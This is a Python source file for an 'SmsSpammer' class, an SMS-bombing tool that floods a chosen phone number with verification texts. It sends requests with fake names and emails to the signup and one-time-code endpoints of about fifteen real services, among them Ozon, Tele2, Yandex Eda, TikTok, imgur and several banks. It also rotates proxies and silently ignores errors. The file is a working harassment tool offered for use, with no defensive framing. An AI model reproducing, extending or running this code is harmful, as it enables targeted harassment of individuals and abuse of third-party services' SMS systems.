
import random
import requests


class SmsSpammer:

    def __init__(self, phone ):
        self.phoneNumber = self.make7phone(phone)
        self.proxies=None
        self.timeout=10
        self.timeoutCounter = 0

    def make7phone(self, phone):
            if phone[0] == '+':
                    phone = phone[1:]
            elif phone[0] == '8':
                    phone = '7'+phone[1:]
            elif phone[0] == '9':
                    phone = '7'+phone
            return phone

    def sendSms(self, url, data="", json="", params=""):
        try:
            if data != "":
                requests.post(url, data=data, proxies=self.proxies, timeout=self.timeout)
            elif json != "":
                requests.post(url, json=json, proxies=self.proxies, timeout=self.timeout)
            elif params != "":
                requests.post(url, params=params, proxies=self.proxies, timeout=self.timeout)
        except:
            self.timeoutCounter = self.timeoutCounter + 1

    def setProxies(self, new_proxies):
        if self.proxies != new_proxies:
            self.timeoutCounter = 0
            self.proxies = new_proxies

    def addparams(self):
            self.name = ''
            for x in range(12):
                    self.name = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
                    self.password = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
                    self.email = "{}@gmail.com".format(self.name)

    def startSending(self):
            self.addparams()
            # phone9 = self.phoneNumbers[1:]
            try:
                self.sendSms("https://youla.ru/web-api/auth/request_code", data={"phone": self.phoneNumber})
                self.sendSms("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+self.phoneNumber} )
                self.sendSms("https://ng-api.webbankir.com/user/v2/create",json={"lastName":"иванов","firstName":"иван","middleName":"иванович","mobilePhone":self.phoneNumber,"email":self.email,"smsCode":""} )
                # self.sendSms("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}} )
                self.sendSms("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":self.phoneNumber,"page":{"pageName":"home","launchMode":"direct","trafficType":""}} )
                self.sendSms("https://msk.tele2.ru/api/validation/number/"+self.phoneNumber, json={"sender": "Tele2"} )
                self.sendSms("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": self.phoneNumber, "otpId": 0} )
                self.sendSms("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+self.phoneNumber} )
                self.sendSms("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": self.phoneNumber} )
                self.sendSms("https://moneyman.ru/registration_api/actions/send-confirmation-code",data={"+"+self.phoneNumber} )
                self.sendSms("https://my.modulbank.ru/api/v2/registration/nameAndPhone",json={"FirstName": self.name, "CellPhone": self.phoneNumber, "Package": "optimal"} )
                self.sendSms("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+"+self.phoneNumber} )
                self.sendSms("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": self.phoneNumber, "region_code": "RU"} )
                self.sendSms("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": self.phoneNumber,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"} )
                self.sendSms("https://api.eldorado.ua/v1/sign/",params={"login": self.phoneNumber,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"} )
                self.sendSms(f"https://www.citilink.ru/registration/confirm/phone/+{self.phoneNumber}/", data={} )
            except:
                    pass
